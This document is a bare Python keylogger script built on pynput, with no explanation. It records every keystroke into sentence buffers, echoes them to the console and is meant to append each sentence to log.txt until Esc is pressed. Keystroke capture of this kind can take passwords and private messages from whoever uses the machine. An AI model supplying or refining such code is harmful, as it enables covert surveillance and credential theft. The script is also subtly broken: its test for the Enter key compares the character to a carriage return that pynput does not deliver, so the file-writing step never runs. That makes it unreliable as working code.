import pynput
from pynput.keyboard import Key, Listener

keys = []
sentence = []

def on_press(key):
    global sentence

    try:
        if key.char == '\r':  # Enter key
            write_file(sentence)
            sentence = []  # Reset sentence buffer
        else:
            sentence.append(key.char)
            print(''.join(sentence), end="\r")  # Print sentence in the same line
    except AttributeError:
        # Handle special keys
        if key == Key.space:
            sentence.append(' ')
        elif key == Key.backspace:
            if sentence:
                sentence.pop()  # Remove last character on backspace
        else:
            print(f'special key {key} pressed')

def write_file(sentence):
    with open('log.txt', 'a') as f:
        f.write(''.join(sentence) + '\n')  # Write the sentence to the file

def on_release(key):
    print(f'{key} released')
    if key == Key.esc:
        # Stop listener
        return False

# Setup the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
